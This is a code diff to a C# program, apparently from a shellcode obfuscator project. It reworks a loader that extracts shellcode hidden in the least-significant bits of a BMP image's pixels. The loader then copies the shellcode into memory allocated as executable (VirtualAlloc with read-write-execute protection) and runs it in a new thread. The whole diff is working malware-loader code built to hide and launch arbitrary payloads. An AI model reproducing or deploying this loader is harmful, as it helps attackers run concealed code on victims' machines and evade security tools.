@@ -7,39 +7,47 @@ namespace csharp
 {
     class Reader
     {
-        const int shellcode_len = 1544 + 16;
+        const int shellcode_len = 2208;
         static byte[] payload_data = new byte[shellcode_len / 8];
 
         static void Main(string[] args)
         {
-            read_image("helpme.bmp");
+            read_image("C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\helpme_x86.bmp");
             run();
             Thread.Sleep(3000);
         }
 
-
         static void read_image(string filename)
         {
             Bitmap bm = new Bitmap(filename);
+
+
+            int length = shellcode_len;
 
             int pos = 0;
             for (int i = bm.Height - 1; i >= 0; i--)
             {
                 for (int j = 0; j < bm.Width; j++)
                 {
-                    if (pos < shellcode_len)
+                    Color pixel_color = bm.GetPixel(j, i);
+
+                    byte[] colors = { 
+                        pixel_color.B,
+                        pixel_color.G,
+                        pixel_color.R
+                    };
+
+                    foreach (byte color in colors)
                     {
-                        Color pixel_color = bm.GetPixel(j, i);
-                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], pixel_color.B);
-                        pos++;
+                        if (length <= 0)
+                        {
+                            return;
+                        }
 
-                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], pixel_color.G);
+                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], color);
                         pos++;
-
-                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], pixel_color.R);
-                        pos++;
+                        length--;
                     }
-                    
                 }
             }
         }
@@ -51,37 +59,20 @@ namespace csharp
         }
 
 
-
-
         static void run() {
-            IntPtr heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-            UInt32 ptr = HeapAlloc(heap, 0, shellcode_len / 8);
+            IntPtr ptr = VirtualAlloc((IntPtr)0, shellcode_len / 8, 0x3000, 0x40);
             Marshal.Copy(payload_data, 0, (IntPtr)ptr, shellcode_len / 8);
 
             CreateThread(0, 0, ptr, (IntPtr)0, 0, 0);
         }
 
-        
-
-
-
-        private static UInt32 HEAP_CREATE_ENABLE_EXECUTE = 0x00040000;
-
-
         [DllImport("kernel32")]
-        private static extern UInt32 HeapAlloc(
-            IntPtr hHeap,
-            UInt32 dwFlags,
-            UInt32 dwBytes
-            );
-
-
-        [DllImport("kernel32")]
-        private static extern IntPtr HeapCreate(
-            UInt32 flOptions,
-            UInt32 dwInitialSize,
-            UInt32 dwMaximumSize
-            );
+        private static extern IntPtr VirtualAlloc(
+            IntPtr lpAddress,
+            UInt32 dwSize,
+            UInt32 flAllocationType,
+            UInt32 flProtect
+        );
 
 
         [DllImport("kernel32")]
@@ -89,11 +80,10 @@ namespace csharp
 
           UInt32 lpThreadAttributes,
           UInt32 dwStackSize,
-          UInt32 lpStartAddress,
+          IntPtr lpStartAddress,
           IntPtr param,
           UInt32 dwCreationFlags,
           UInt32 lpThreadId
-
           );
     }
 
